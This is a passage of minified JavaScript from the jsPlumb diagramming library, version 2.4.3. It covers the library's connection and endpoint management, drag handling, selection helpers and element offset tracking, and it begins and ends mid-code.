            }
        },
        clearTypes: function(a, b) {
            for (var c = this._jsPlumb.types.length, d = 0; d < c; d++)
                n(this, 0),
                this._jsPlumb.types.splice(0, 1);
            l(this, a, b)
        },
        toggleType: function(a, b, c) {
            var d = i(a);
            if (null != d) {
                for (var e = 0, f = d.length; e < f; e++) {
                    var g = this._jsPlumb.types.indexOf(d[e]);
                    g !== -1 ? (n(this, g),
                    this._jsPlumb.types.splice(g, 1)) : this._jsPlumb.types.push(d[e])
                }
                l(this, b, c)
            }
        },
        applyType: function(a, b) {
            if (this.setPaintStyle(a.paintStyle, b),
            this.setHoverPaintStyle(a.hoverPaintStyle, b),
            a.parameters)
                for (var c in a.parameters)
                    this.setParameter(c, a.parameters[c]);
            this._jsPlumb.paintStyleInUse = this.getPaintStyle()
        },
        setPaintStyle: function(a, b) {
            this._jsPlumb.paintStyle = a,
            this._jsPlumb.paintStyleInUse = this._jsPlumb.paintStyle,
            f(this),
            b || this.repaint()
        },
        getPaintStyle: function() {
            return this._jsPlumb.paintStyle
        },
        setHoverPaintStyle: function(a, b) {
            this._jsPlumb.hoverPaintStyle = a,
            f(this),
            b || this.repaint()
        },
        getHoverPaintStyle: function() {
            return this._jsPlumb.hoverPaintStyle
        },
        destroy: function(a) {
            (a || null == this.typeId) && (this.cleanupListeners(),
            this.clone = null,
            this._jsPlumb = null)
        },
        isHover: function() {
            return this._jsPlumb.hover
        },
        setHover: function(a, b, c) {
            if (this._jsPlumb && !this._jsPlumb.instance.currentlyDragging && !this._jsPlumb.instance.isHoverSuspended()) {
                this._jsPlumb.hover = a;
                var d = a ? "addClass" : "removeClass";
                null != this.canvas && (null != this._jsPlumb.instance.hoverClass && this._jsPlumb.instance[d](this.canvas, this._jsPlumb.instance.hoverClass),
                null != this._jsPlumb.hoverClass && this._jsPlumb.instance[d](this.canvas, this._jsPlumb.hoverClass)),
                null != this._jsPlumb.hoverPaintStyle && (this._jsPlumb.paintStyleInUse = a ? this._jsPlumb.hoverPaintStyle : this._jsPlumb.paintStyle,
                this._jsPlumb.instance.isSuspendDrawing() || (c = c || e(),
                this.repaint({
                    timestamp: c,
                    recalc: !1
                }))),
                this.getAttachedElements && !b && h(this, a, e(), this)
            }
        }
    });
    var o = 0
      , p = function() {
        var a = o + 1;
        return o++,
        a
    }
      , q = b.jsPlumbInstance = function(f) {
        this.version = "2.4.3",
        f && r.extend(this.Defaults, f),
        this.logEnabled = this.Defaults.LogEnabled,
        this._connectionTypes = {},
        this._endpointTypes = {},
        d.EventGenerator.apply(this);
        var h = this
          , i = p()
          , j = h.bind
          , l = {}
          , n = 1
          , o = function(a) {
            if (null == a)
                return null;
            if (3 === a.nodeType || 8 === a.nodeType)
                return {
                    el: a,
                    text: !0
                };
            var b = h.getElement(a);
            return {
                el: b,
                id: d.isString(a) && null == b ? a : Z(b)
            }
        };
        this.getInstanceIndex = function() {
            return i
        }
        ,
        this.setZoom = function(a, b) {
            return n = a,
            h.fire("zoom", n),
            b && h.repaintEverything(),
            !0
        }
        ,
        this.getZoom = function() {
            return n
        }
        ;
        for (var q in this.Defaults)
            l[q] = this.Defaults[q];
        var s, t = [];
        this.unbindContainer = function() {
            if (null != s && t.length > 0)
                for (var a = 0; a < t.length; a++)
                    h.off(s, t[a][0], t[a][1])
        }
        ,
        this.setContainer = function(a) {
            this.unbindContainer(),
            a = this.getElement(a),
            this.select().each(function(b) {
                b.moveParent(a)
            }),
            this.selectEndpoints().each(function(b) {
                b.moveParent(a)
            });
            var b = s;
            s = a,
            t.length = 0;
            for (var c = {
                endpointclick: "endpointClick",
                endpointdblclick: "endpointDblClick"
            }, d = function(a, b, d) {
                var e = b.srcElement || b.target
                  , f = (e && e.parentNode ? e.parentNode._jsPlumb : null) || (e ? e._jsPlumb : null) || (e && e.parentNode && e.parentNode.parentNode ? e.parentNode.parentNode._jsPlumb : null);
                if (f) {
                    f.fire(a, f, b);
                    var g = d ? c[d + a] || a : a;
                    h.fire(g, f.component || f, b)
                }
            }, e = function(a, b, c) {
                t.push([a, c]),
                h.on(s, a, b, c)
            }, f = function(a) {
                e(a, ".jtk-connector", function(b) {
                    d(a, b)
                }),
                e(a, ".jtk-endpoint", function(b) {
                    d(a, b, "endpoint")
                }),
                e(a, ".jtk-overlay", function(b) {
                    d(a, b)
                })
            }, i = 0; i < g.length; i++)
                f(g[i]);
            for (var j in z) {
                var k = z[j].el;
                k.parentNode === b && (b.removeChild(k),
                s.appendChild(k))
            }
        }
        ,
        this.getContainer = function() {
            return s
        }
        ,
        this.bind = function(a, b) {
            "ready" === a && v ? b() : j.apply(h, [a, b])
        }
        ,
        h.importDefaults = function(a) {
            for (var b in a)
                h.Defaults[b] = a[b];
            return a.Container && h.setContainer(a.Container),
            h
        }
        ,
        h.restoreDefaults = function() {
            return h.Defaults = r.extend({}, l),
            h
        }
        ;
        var u = null
          , v = !1
          , w = []
          , x = {}
          , y = {}
          , z = {}
          , A = {}
          , B = {}
          , C = {}
          , D = !1
          , E = []
          , F = !1
          , G = null
          , H = this.Defaults.Scope
          , I = 1
          , J = function() {
            return "" + I++
        }
          , K = function(a, b) {
            s ? s.appendChild(a) : b ? this.getElement(b).appendChild(a) : this.appendToRoot(a)
        }
        .bind(this)
          , L = function(a, b, c, d) {
            if (!F) {
                var f, g = Z(a), i = h.getDragManager();
                i && (f = i.getElementsForDraggable(g)),
                null == c && (c = e());
                var j = ua({
                    elId: g,
                    offset: b,
                    recalc: !1,
                    timestamp: c
                });
                if (f && j && j.o)
                    for (var k in f)
                        ua({
                            elId: f[k].id,
                            offset: {
                                left: j.o.left + f[k].offset.left,
                                top: j.o.top + f[k].offset.top
                            },
                            recalc: !1,
                            timestamp: c
                        });
                if (h.anchorManager.redraw(g, b, c, null, d),
                f)
                    for (var l in f)
                        h.anchorManager.redraw(f[l].id, b, c, f[l].offset, d, !0)
            }
        }
          , M = function(a) {
            return y[a]
        }
          , N = function(a, b, c, e, f) {
            if (!r.headless) {
                var g = null != b && b;
                if (g && r.isDragSupported(a, h)) {
                    var i = c || h.Defaults.DragOptions;
                    if (i = r.extend({}, i),
                    r.isAlreadyDraggable(a, h))
                        c.force && h.initDraggable(a, i);
                    else {
                        var j = r.dragEvents.drag
                          , k = r.dragEvents.stop
                          , l = r.dragEvents.start
                          , m = !1;
                        ta(e, a),
                        i[l] = d.wrap(i[l], function() {
                            if (h.setHoverSuspended(!0),
                            h.select({
                                source: a
                            }).addClass(h.elementDraggingClass + " " + h.sourceElementDraggingClass, !0),
                            h.select({
                                target: a
                            }).addClass(h.elementDraggingClass + " " + h.targetElementDraggingClass, !0),
                            h.setConnectionBeingDragged(!0),
                            i.canDrag)
                                return c.canDrag()
                        }, !1),
                        i[j] = d.wrap(i[j], function() {
                            var b = h.getUIPosition(arguments, h.getZoom());
                            null != b && (L(a, b, null, !0),
                            m && h.addClass(a, "jtk-dragged"),
                            m = !0)
                        }),
                        i[k] = d.wrap(i[k], function() {
                            for (var a, b = arguments[0].selection, c = function(b) {
                                null != b[1] && (a = h.getUIPosition([{
                                    el: b[2].el,
                                    pos: [b[1].left, b[1].top]
                                }]),
                                L(b[2].el, a)),
                                h.removeClass(b[0], "jtk-dragged"),
                                h.select({
                                    source: b[2].el
                                }).removeClass(h.elementDraggingClass + " " + h.sourceElementDraggingClass, !0),
                                h.select({
                                    target: b[2].el
                                }).removeClass(h.elementDraggingClass + " " + h.targetElementDraggingClass, !0),
                                h.getDragManager().dragEnded(b[2].el)
                            }, d = 0; d < b.length; d++)
                                c(b[d]);
                            m = !1,
                            h.setHoverSuspended(!1),
                            h.setConnectionBeingDragged(!1)
                        });
                        var n = Z(a);
                        C[n] = !0;
                        var o = C[n];
                        i.disabled = null != o && !o,
                        h.initDraggable(a, i),
                        h.getDragManager().register(a),
                        f && h.fire("elementDraggable", {
                            el: a,
                            options: i
                        })
                    }
                }
            }
        }
          , O = function(a, b) {
            for (var c = a.scope.split(/\s/), d = b.scope.split(/\s/), e = 0; e < c.length; e++)
                for (var f = 0; f < d.length; f++)
                    if (d[f] === c[e])
                        return !0;
            return !1
        }
          , P = function(a, b) {
            var c = r.extend({}, a);
            if (b && r.extend(c, b),
            c.source && (c.source.endpoint ? c.sourceEndpoint = c.source : c.source = h.getElement(c.source)),
            c.target && (c.target.endpoint ? c.targetEndpoint = c.target : c.target = h.getElement(c.target)),
            a.uuids && (c.sourceEndpoint = M(a.uuids[0]),
            c.targetEndpoint = M(a.uuids[1])),
            c.sourceEndpoint && c.sourceEndpoint.isFull())
                return void d.log(h, "could not add connection; source endpoint is full");
            if (c.targetEndpoint && c.targetEndpoint.isFull())
                return void d.log(h, "could not add connection; target endpoint is full");
            if (!c.type && c.sourceEndpoint && (c.type = c.sourceEndpoint.connectionType),
            c.sourceEndpoint && c.sourceEndpoint.connectorOverlays) {
                c.overlays = c.overlays || [];
                for (var e = 0, f = c.sourceEndpoint.connectorOverlays.length; e < f; e++)
                    c.overlays.push(c.sourceEndpoint.connectorOverlays[e])
            }
            c.sourceEndpoint && c.sourceEndpoint.scope && (c.scope = c.sourceEndpoint.scope),
            !c["pointer-events"] && c.sourceEndpoint && c.sourceEndpoint.connectorPointerEvents && (c["pointer-events"] = c.sourceEndpoint.connectorPointerEvents);
            var g = function(a, b) {
                var c = r.extend({}, a);
                for (var d in b)
                    b[d] && (c[d] = b[d]);
                return c
            }
              , i = function(a, b, d) {
                return h.addEndpoint(a, g(b, {
                    anchor: c.anchors ? c.anchors[d] : c.anchor,
                    endpoint: c.endpoints ? c.endpoints[d] : c.endpoint,
                    paintStyle: c.endpointStyles ? c.endpointStyles[d] : c.endpointStyle,
                    hoverPaintStyle: c.endpointHoverStyles ? c.endpointHoverStyles[d] : c.endpointHoverStyle
                }))
            }
              , j = function(a, b, d, e) {
                if (c[a] && !c[a].endpoint && !c[a + "Endpoint"] && !c.newConnection) {
                    var f = Z(c[a])
                      , g = d[f];
                    if (g = g ? g[e] : null) {
                        if (!g.enabled)
                            return !1;
                        var h = null != g.endpoint && g.endpoint._jsPlumb ? g.endpoint : i(c[a], g.def, b);
                        if (h.isFull())
                            return !1;
                        c[a + "Endpoint"] = h,
                        !c.scope && g.def.scope && (c.scope = g.def.scope),
                        h.setDeleteOnEmpty(!0),
                        g.uniqueEndpoint && (g.endpoint ? h.finalEndpoint = g.endpoint : (g.endpoint = h,
                        h.setDeleteOnEmpty(!1)))
                    }
                }
            };
            return j("source", 0, this.sourceEndpointDefinitions, c.type || "default") !== !1 && j("target", 1, this.targetEndpointDefinitions, c.type || "default") !== !1 ? (c.sourceEndpoint && c.targetEndpoint && (O(c.sourceEndpoint, c.targetEndpoint) || (c = null)),
            c) : void 0
        }
        .bind(h)
          , Q = function(a) {
            var b = h.Defaults.ConnectionType || h.getDefaultConnectionType();
            a._jsPlumb = h,
            a.newConnection = Q,
            a.newEndpoint = S,
            a.endpointsByUUID = y,
            a.endpointsByElement = x,
            a.finaliseConnection = R,
            a.id = "con_" + J();
            var c = new b(a);
            return c.isDetachable() && (c.endpoints[0].initDraggable("_jsPlumbSource"),
            c.endpoints[1].initDraggable("_jsPlumbTarget")),
            c
        }
          , R = h.finaliseConnection = function(a, b, c, d) {
            if (b = b || {},
            a.suspendedEndpoint || w.push(a),
            a.pending = null,
            a.endpoints[0].isTemporarySource = !1,
            d !== !1 && h.anchorManager.newConnection(a),
            L(a.source),
            !b.doNotFireConnectionEvent && b.fireEvent !== !1) {
                var e = {
                    connection: a,
                    source: a.source,
                    target: a.target,
                    sourceId: a.sourceId,
                    targetId: a.targetId,
                    sourceEndpoint: a.endpoints[0],
                    targetEndpoint: a.endpoints[1]
                };
                h.fire("connection", e, c)
            }
        }
          , S = function(a, b) {
            var c = h.Defaults.EndpointType || r.Endpoint
              , d = r.extend({}, a);
            d._jsPlumb = h,
            d.newConnection = Q,
            d.newEndpoint = S,
            d.endpointsByUUID = y,
            d.endpointsByElement = x,
            d.fireDetachEvent = aa,
            d.elementId = b || Z(d.source);
            var e = new c(d);
            return e.id = "ep_" + J(),
            ta(d.elementId, d.source),
            r.headless || h.getDragManager().endpointAdded(d.source, b),
            e
        }
          , T = function(a, b, c) {
            var d = x[a];
            if (d && d.length)
                for (var e = 0, f = d.length; e < f; e++) {
                    for (var g = 0, h = d[e].connections.length; g < h; g++) {
                        var i = b(d[e].connections[g]);
                        if (i)
                            return
                    }
                    c && c(d[e])
                }
        }
          , U = function(a, b) {
            return r.each(a, function(a) {
                h.isDragSupported(a) && (C[h.getAttribute(a, "id")] = b,
                h.setElementDraggable(a, b))
            })
        }
          , V = function(a, b, c) {
            b = "block" === b;
            var d = null;
            c && (d = function(a) {
                a.setVisible(b, !0, !0)
            }
            );
            var e = o(a);
            T(e.id, function(a) {
                if (b && c) {
                    var d = a.sourceId === e.id ? 1 : 0;
                    a.endpoints[d].isVisible() && a.setVisible(!0)
                } else
                    a.setVisible(b)
            }, d)
        }
          , W = function(a) {
            var b;
            return r.each(a, function(a) {
                var c = h.getAttribute(a, "id");
                return b = null != C[c] && C[c],
                b = !b,
                C[c] = b,
                h.setDraggable(a, b),
                b
            }
            .bind(this)),
            b
        }
          , X = function(a, b) {
            var c = null;
            b && (c = function(a) {
                var b = a.isVisible();
                a.setVisible(!b)
            }
            ),
            T(a, function(a) {
                var b = a.isVisible();
                a.setVisible(!b)
            }, c)
        }
          , Y = function(a) {
            var b = A[a];
            return b ? {
                o: b,
                s: E[a]
            } : ua({
                elId: a
            })
        }
          , Z = function(a, b, c) {
            if (d.isString(a))
                return a;
            if (null == a)
                return null;
            var e = h.getAttribute(a, "id");
            return e && "undefined" !== e || (2 === arguments.length && void 0 !== arguments[1] ? e = b : (1 === arguments.length || 3 === arguments.length && !arguments[2]) && (e = "jsPlumb_" + i + "_" + J()),
            c || h.setAttribute(a, "id", e)),
            e
        };
        this.setConnectionBeingDragged = function(a) {
            D = a
        }
        ,
        this.isConnectionBeingDragged = function() {
            return D
        }
        ,
        this.getManagedElements = function() {
            return z
        }
        ,
        this.connectorClass = "jtk-connector",
        this.connectorOutlineClass = "jtk-connector-outline",
        this.editableConnectorClass = "jtk-connector-editable",
        this.connectedClass = "jtk-connected",
        this.hoverClass = "jtk-hover",
        this.endpointClass = "jtk-endpoint",
        this.endpointConnectedClass = "jtk-endpoint-connected",
        this.endpointFullClass = "jtk-endpoint-full",
        this.endpointDropAllowedClass = "jtk-endpoint-drop-allowed",
        this.endpointDropForbiddenClass = "jtk-endpoint-drop-forbidden",
        this.overlayClass = "jtk-overlay",
        this.draggingClass = "jtk-dragging",
        this.elementDraggingClass = "jtk-element-dragging",
        this.sourceElementDraggingClass = "jtk-source-element-dragging",
        this.targetElementDraggingClass = "jtk-target-element-dragging",
        this.endpointAnchorClassPrefix = "jtk-endpoint-anchor",
        this.hoverSourceClass = "jtk-source-hover",
        this.hoverTargetClass = "jtk-target-hover",
        this.dragSelectClass = "jtk-drag-select",
        this.Anchors = {},
        this.Connectors = {
            svg: {}
        },
        this.Endpoints = {
            svg: {}
        },
        this.Overlays = {
            svg: {}
        },
        this.ConnectorRenderers = {},
        this.SVG = "svg",
        this.addEndpoint = function(a, b, c) {
            c = c || {};
            var e = r.extend({}, c);
            r.extend(e, b),
            e.endpoint = e.endpoint || h.Defaults.Endpoint,
            e.paintStyle = e.paintStyle || h.Defaults.EndpointStyle;
            for (var f = [], g = d.isArray(a) || null != a.length && !d.isString(a) ? a : [a], i = 0, j = g.length; i < j; i++) {
                e.source = h.getElement(g[i]),
                ra(e.source);
                var k = Z(e.source)
                  , l = S(e, k)
                  , m = ta(k, e.source).info.o;
                d.addToList(x, k, l),
                F || l.paint({
                    anchorLoc: l.anchor.compute({
                        xy: [m.left, m.top],
                        wh: E[k],
                        element: l,
                        timestamp: G
                    }),
                    timestamp: G
                }),
                f.push(l)
            }
            return 1 === f.length ? f[0] : f
        }
        ,
        this.addEndpoints = function(a, b, c) {
            for (var e = [], f = 0, g = b.length; f < g; f++) {
                var i = h.addEndpoint(a, b[f], c);
                d.isArray(i) ? Array.prototype.push.apply(e, i) : e.push(i)
            }
            return e
        }
        ,
        this.animate = function(a, b, c) {
            if (!this.animationSupported)
                return !1;
            c = c || {};
            var e = h.getElement(a)
              , f = Z(e)
              , g = r.animEvents.step
              , i = r.animEvents.complete;
            c[g] = d.wrap(c[g], function() {
                h.revalidate(f)
            }),
            c[i] = d.wrap(c[i], function() {
                h.revalidate(f)
            }),
            h.doAnimate(e, b, c)
        }
        ,
        this.checkCondition = function(a, b) {
            var c = h.getListener(a)
              , e = !0;
            if (c && c.length > 0) {
                var f = Array.prototype.slice.call(arguments, 1);
                try {
                    for (var g = 0, i = c.length; g < i; g++)
                        e = e && c[g].apply(c[g], f)
                } catch (b) {
                    d.log(h, "cannot check condition [" + a + "]" + b)
                }
            }
            return e
        }
        ,
        this.connect = function(a, b) {
            var c, e = P(a, b);
            if (e) {
                if (null == e.source && null == e.sourceEndpoint)
                    return void d.log("Cannot establish connection - source does not exist");
                if (null == e.target && null == e.targetEndpoint)
                    return void d.log("Cannot establish connection - target does not exist");
                ra(e.source),
                c = Q(e),
                R(c, e)
            }
            return c
        }
        ;
        var $ = [{
            el: "source",
            elId: "sourceId",
            epDefs: "sourceEndpointDefinitions"
        }, {
            el: "target",
            elId: "targetId",
            epDefs: "targetEndpointDefinitions"
        }]
          , _ = function(a, b, c, d) {
            var e, f, g, h = $[c], i = a[h.elId], j = (a[h.el],
            a.endpoints[c]), k = {
                index: c,
                originalSourceId: 0 === c ? i : a.sourceId,
                newSourceId: a.sourceId,
                originalTargetId: 1 === c ? i : a.targetId,
                newTargetId: a.targetId,
                connection: a
            };
            if (b.constructor === r.Endpoint)
                e = b,
                e.addConnection(a),
                b = e.element;
            else if (f = Z(b),
            g = this[h.epDefs][f],
            f === a[h.elId])
                e = null;
            else if (g)
                for (var l in g) {
                    if (!g[l].enabled)
                        return;
                    e = null != g[l].endpoint && g[l].endpoint._jsPlumb ? g[l].endpoint : this.addEndpoint(b, g[l].def),
                    g[l].uniqueEndpoint && (g[l].endpoint = e),
                    e.addConnection(a)
                }
            else
                e = a.makeEndpoint(0 === c, b, f);
            return null != e && (j.detachFromConnection(a),
            a.endpoints[c] = e,
            a[h.el] = e.element,
            a[h.elId] = e.elementId,
            k[0 === c ? "newSourceId" : "newTargetId"] = e.elementId,
            ba(k),
            d || a.repaint()),
            k.element = b,
            k
        }
        .bind(this);
        this.setSource = function(a, b, c) {
            var d = _(a, b, 0, c);
            this.anchorManager.sourceChanged(d.originalSourceId, d.newSourceId, a, d.el)
        }
        ,
        this.setTarget = function(a, b, c) {
            var d = _(a, b, 1, c);
            this.anchorManager.updateOtherEndpoint(d.originalSourceId, d.originalTargetId, d.newTargetId, a)
        }
        ,
        this.deleteEndpoint = function(a, b, c) {
            var d = "string" == typeof a ? y[a] : a;
            return d && h.deleteObject({
                endpoint: d,
                dontUpdateHover: b,
                deleteAttachedObjects: c
            }),
            h
        }
        ,
        this.deleteEveryEndpoint = function() {
            var a = h.setSuspendDrawing(!0);
            for (var b in x) {
                var c = x[b];
                if (c && c.length)
                    for (var d = 0, e = c.length; d < e; d++)
                        h.deleteEndpoint(c[d], !0)
            }
            x = {},
            z = {},
            y = {},
            A = {},
            B = {},
            h.anchorManager.reset();
            var f = h.getDragManager();
            return f && f.reset(),
            a || h.setSuspendDrawing(!1),
            h
        }
        ;
        var aa = function(a, b, c) {
            var d = h.Defaults.ConnectionType || h.getDefaultConnectionType()
              , e = a.constructor === d
              , f = e ? {
                connection: a,
                source: a.source,
                target: a.target,
                sourceId: a.sourceId,
                targetId: a.targetId,
                sourceEndpoint: a.endpoints[0],
                targetEndpoint: a.endpoints[1]
            } : a;
            b && h.fire("connectionDetached", f, c),
            h.fire("internal.connectionDetached", f, c),
            h.anchorManager.connectionDetached(f)
        }
          , ba = h.fireMoveEvent = function(a, b) {
            h.fire("connectionMoved", a, b)
        }
        ;
        this.unregisterEndpoint = function(a) {
            a._jsPlumb.uuid && (y[a._jsPlumb.uuid] = null),
            h.anchorManager.deleteEndpoint(a);
            for (var b in x) {
                var c = x[b];
                if (c) {
                    for (var d = [], e = 0, f = c.length; e < f; e++)
                        c[e] !== a && d.push(c[e]);
                    x[b] = d
                }
                x[b].length < 1 && delete x[b]
            }
        }
        ;
        var ca = "isDetachAllowed"
          , da = "beforeDetach"
          , ea = "checkCondition";
        this.deleteConnection = function(a, b) {
            return !(null == a || (b = b || {},
            !b.force && !d.functionChain(!0, !1, [[a.endpoints[0], ca, [a]], [a.endpoints[1], ca, [a]], [a, ca, [a]], [h, ea, [da, a]]]))) && (a.setHover(!1),
            aa(a, !a.pending && b.fireEvent !== !1, b.originalEvent),
            a.endpoints[0].detachFromConnection(a),
            a.endpoints[1].detachFromConnection(a),
            d.removeWithFunction(w, function(b) {
                return a.id === b.id
            }),
            a.cleanup(),
            a.destroy(),
            !0)
        }
        ,
        this.deleteEveryConnection = function(a) {
            a = a || {};
            var b = w.length
              , c = 0;
            return h.batch(function() {
                for (var d = 0; d < b; d++)
                    c += h.deleteConnection(w[0], a) ? 1 : 0
            }),
            c
        }
        ,
        this.deleteConnectionsForElement = function(a, b) {
            b = b || {},
            a = h.getElement(a);
            var c = Z(a)
              , d = x[c];
            if (d && d.length)
                for (var e = 0, f = d.length; e < f; e++)
                    d[e].deleteEveryConnection(b);
            return h
        }
        ,
        this.deleteObject = function(a) {
            var b = {
                endpoints: {},
                connections: {},
                endpointCount: 0,
                connectionCount: 0
            }
              , c = a.deleteAttachedObjects !== !1
              , e = function(c) {
                null != c && null == b.connections[c.id] && (a.dontUpdateHover || null == c._jsPlumb || c.setHover(!1),
                b.connections[c.id] = c,
                b.connectionCount++)
            }
              , f = function(d) {
                if (null != d && null == b.endpoints[d.id] && (a.dontUpdateHover || null == d._jsPlumb || d.setHover(!1),
                b.endpoints[d.id] = d,
                b.endpointCount++,
                c))
                    for (var f = 0; f < d.connections.length; f++) {
                        var g = d.connections[f];
                        e(g)
                    }
            };
            a.connection ? e(a.connection) : f(a.endpoint);
            for (var g in b.connections) {
                var i = b.connections[g];
                if (i._jsPlumb) {
                    d.removeWithFunction(w, function(a) {
                        return i.id === a.id
                    }),
                    aa(i, a.fireEvent !== !1 && !i.pending, a.originalEvent);
                    var j = null == a.deleteAttachedObjects ? null : !a.deleteAttachedObjects;
                    i.endpoints[0].detachFromConnection(i, null, j),
                    i.endpoints[1].detachFromConnection(i, null, j),
                    i.cleanup(!0),
                    i.destroy(!0)
                }
            }
            for (var k in b.endpoints) {
                var l = b.endpoints[k];
                l._jsPlumb && (h.unregisterEndpoint(l),
                l.cleanup(!0),
                l.destroy(!0))
            }
            return b
        }
        ,
        this.draggable = function(a, b) {
            var c;
            return k(function(a) {
                c = o(a),
                c.el && N(c.el, !0, b, c.id, !0)
            }, a),
            h
        }
        ,
        this.droppable = function(a, b) {
            var c;
            return b = b || {},
            b.allowLoopback = !1,
            k(function(a) {
                c = o(a),
                c.el && h.initDroppable(c.el, b)
            }, a),
            h
        }
        ;
        var fa = function(a, b, c, d) {
            for (var e = 0, f = a.length; e < f; e++)
                a[e][b].apply(a[e], c);
            return d(a)
        }
          , ga = function(a, b, c) {
            for (var d = [], e = 0, f = a.length; e < f; e++)
                d.push([a[e][b].apply(a[e], c), a[e]]);
            return d
        }
          , ha = function(a, b, c) {
            return function() {
                return fa(a, b, arguments, c)
            }
        }
          , ia = function(a, b) {
            return function() {
                return ga(a, b, arguments)
            }
        }
          , ja = function(a, b) {
            var c = [];
            if (a)
                if ("string" == typeof a) {
                    if ("*" === a)
                        return a;
                    c.push(a)
                } else if (b)
                    c = a;
                else if (a.length)
                    for (var d = 0, e = a.length; d < e; d++)
                        c.push(o(a[d]).id);
                else
                    c.push(o(a).id);
            return c
        }
          , ka = function(a, b, c) {
            return "*" === a || (a.length > 0 ? a.indexOf(b) !== -1 : !c)
        };
        this.getConnections = function(a, b) {
            a ? a.constructor === String && (a = {
                scope: a
            }) : a = {};
            for (var c = a.scope || h.getDefaultScope(), d = ja(c, !0), e = ja(a.source), f = ja(a.target), g = !b && d.length > 1 ? {} : [], i = function(a, c) {
                if (!b && d.length > 1) {
                    var e = g[a];
                    null == e && (e = g[a] = []),
                    e.push(c)
                } else
                    g.push(c)
            }, j = 0, k = w.length; j < k; j++) {
                var l = w[j]
                  , m = l.proxies && l.proxies[0] ? l.proxies[0].originalEp.elementId : l.sourceId
                  , n = l.proxies && l.proxies[1] ? l.proxies[1].originalEp.elementId : l.targetId;
                ka(d, l.scope) && ka(e, m) && ka(f, n) && i(l.scope, l)
            }
            return g
        }
        ;
        var la = function(a, b) {
            return function(c) {
                for (var d = 0, e = a.length; d < e; d++)
                    c(a[d]);
                return b(a)
            }
        }
          , ma = function(a) {
            return function(b) {
                return a[b]
            }
        }
          , na = function(a, b) {
            var c, d, e = {
                length: a.length,
                each: la(a, b),
                get: ma(a)
            }, f = ["setHover", "removeAllOverlays", "setLabel", "addClass", "addOverlay", "removeOverlay", "removeOverlays", "showOverlay", "hideOverlay", "showOverlays", "hideOverlays", "setPaintStyle", "setHoverPaintStyle", "setSuspendEvents", "setParameter", "setParameters", "setVisible", "repaint", "addType", "toggleType", "removeType", "removeClass", "setType", "bind", "unbind"], g = ["getLabel", "getOverlay", "isHover", "getParameter", "getParameters", "getPaintStyle", "getHoverPaintStyle", "isVisible", "hasType", "getType", "isSuspendEvents"];
            for (c = 0,
            d = f.length; c < d; c++)
                e[f[c]] = ha(a, f[c], b);
            for (c = 0,
            d = g.length; c < d; c++)
                e[g[c]] = ia(a, g[c]);
            return e
        }
          , oa = function(a) {
            var b = na(a, oa);
            return r.extend(b, {
                setDetachable: ha(a, "setDetachable", oa),
                setReattach: ha(a, "setReattach", oa),
                setConnector: ha(a, "setConnector", oa),
                delete: function() {
                    for (var b = 0, c = a.length; b < c; b++)
                        h.deleteConnection(a[b])
                },
                isDetachable: ia(a, "isDetachable"),
                isReattach: ia(a, "isReattach")
            })
        }
          , pa = function(a) {
            var b = na(a, pa);
            return r.extend(b, {
                setEnabled: ha(a, "setEnabled", pa),
                setAnchor: ha(a, "setAnchor", pa),
                isEnabled: ia(a, "isEnabled"),
                deleteEveryConnection: function() {
                    for (var b = 0, c = a.length; b < c; b++)
                        a[b].deleteEveryConnection()
                },
                delete: function() {
                    for (var b = 0, c = a.length; b < c; b++)
                        h.deleteEndpoint(a[b])
                }
            })
        };
        this.select = function(a) {
            return a = a || {},
            a.scope = a.scope || "*",
            oa(a.connections || h.getConnections(a, !0))
        }
        ,
        this.selectEndpoints = function(a) {
            a = a || {},
            a.scope = a.scope || "*";
            var b = !a.element && !a.source && !a.target
              , c = b ? "*" : ja(a.element)
              , d = b ? "*" : ja(a.source)
              , e = b ? "*" : ja(a.target)
              , f = ja(a.scope, !0)
              , g = [];
            for (var h in x) {
                var i = ka(c, h, !0)
                  , j = ka(d, h, !0)
                  , k = "*" !== d
                  , l = ka(e, h, !0)
                  , m = "*" !== e;
                if (i || j || l)
                    a: for (var n = 0, o = x[h].length; n < o; n++) {
                        var p = x[h][n];
                        if (ka(f, p.scope, !0)) {
                            var q = k && d.length > 0 && !p.isSource
                              , r = m && e.length > 0 && !p.isTarget;
                            if (q || r)
                                continue a;
                            g.push(p)
                        }
                    }
            }
            return pa(g)
        }
        ,
        this.getAllConnections = function() {
            return w
        }
        ,
        this.getDefaultScope = function() {
            return H
        }
        ,
        this.getEndpoint = M,
        this.getEndpoints = function(a) {
            return x[o(a).id] || []
        }
        ,
        this.getDefaultEndpointType = function() {
            return r.Endpoint
        }
        ,
        this.getDefaultConnectionType = function() {
            return r.Connection
        }
        ,
        this.getId = Z,
        this.appendElement = K;
        var qa = !1;
        this.isHoverSuspended = function() {
            return qa
        }
        ,
        this.setHoverSuspended = function(a) {
            qa = a
        }
        ,
        this.hide = function(a, b) {
            return V(a, "none", b),
            h
        }
        ,
        this.idstamp = J,
        this.connectorsInitialized = !1,
        this.registerConnectorType = function(a, b) {
            c.push([a, b])
        }
        ;
        var ra = function(a) {
            if (!s && a) {
                var b = h.getElement(a);
                b.offsetParent && h.setContainer(b.offsetParent)
            }
        }
          , sa = function() {
            h.Defaults.Container && h.setContainer(h.Defaults.Container)
        }
          , ta = h.manage = function(a, b, c) {
            return z[a] || (z[a] = {
                el: b,
                endpoints: [],
                connections: []
            },
            z[a].info = ua({
                elId: a,
                timestamp: G
            }),
            c || h.fire("manageElement", {
                id: a,
                info: z[a].info,
                el: b
            })),
            z[a]
        }
          , ua = this.updateOffset = function(a) {
            var b, c = a.timestamp, d = a.recalc, e = a.offset, f = a.elId;
            return F && !c && (c = G),
            !d && c && c === B[f] ? {
                o: a.offset || A[f],
                s: E[f]
            } : (d || !e && null == A[f] ? (b = z[f] ? z[f].el : null,
            null != b && (E[f] = h.getSize(b),
            A[f] = h.getOffset(b),
            B[f] = c)) : (A[f] = e || A[f],
            null == E[f] && (b = z[f].el,
            null != b && (E[f] = h.getSize(b))),
            B[f] = c),
            A[f] && !A[f].right && (A[f].right = A[f].left + E[f][0],
            A[f].bottom = A[f].top + E[f][1],
            A[f].width = E[f][0],
            A[f].height = E[f][1],
            A[f].centerx = A[f].left + A[f].width / 2,
            A[f].centery = A[f].top + A[f].height / 2),
            {
                o: A[f],
                s: E[f]
            })
        }
        ;
        this.init = function() {
            a = b.jsPlumb.getRenderModes();
            var e = function(a, c, e) {
                b.jsPlumb.Connectors[a][c] = function() {
                    e.apply(this, arguments),
                    b.jsPlumb.ConnectorRenderers[a].apply(this, arguments)
                }
                ,
                d.extend(b.jsPlumb.Connectors[a][c], [e, b.jsPlumb.ConnectorRenderers[a]])
            };
            if (!b.jsPlumb.connectorsInitialized) {
